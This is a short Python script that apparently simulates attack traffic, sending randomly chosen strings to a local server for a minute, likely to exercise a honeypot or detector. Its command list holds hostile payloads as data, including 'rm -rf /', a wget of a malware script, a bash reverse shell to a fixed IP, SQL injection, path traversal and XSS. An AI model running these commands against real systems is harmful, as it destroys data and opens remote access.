import socket
import time
import random

# Configuration
SERVER_IP = 'localhost'  # Server IP address
SERVER_PORT = 9999       # Server port number
ATTACK_DURATION = 60     # Duration of the attack simulation in seconds
COMMANDS = [
    'ls', 'pwd', 'echo $PATH', 'rm -rf /', 'wget http://malicious.com/malware.sh',
    'nc -zv 192.168.1.1 1-100', '/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1',
    'UPDATE users SET password = "hacked" WHERE id = 1;', 'INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");',
    'netstat', 'telnet 192.168.0.1 25', '../etc/passwd', 'admin\' OR 1=1 --', '<script>alert("XSS")</script>'
]

def generate_command():
    """Randomly choose a command from the list."""
    return random.choice(COMMANDS)

def random_interval():
    """Generate a random interval to mimic human behavior."""
    return random.uniform(0.5, 3.0)  # Between 0.5 and 3 seconds

def main():
    """
    Runs the show
    """
    start_time = time.time()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((SERVER_IP, SERVER_PORT))
        
        while time.time() - start_time < ATTACK_DURATION:
            cmd = generate_command()
            sock.sendall(cmd.encode('utf-8'))
            print(f"Sent: {cmd}")
            time.sleep(random_interval())
    
    print("Attack simulation completed.")

if __name__ == "__main__":
    main()
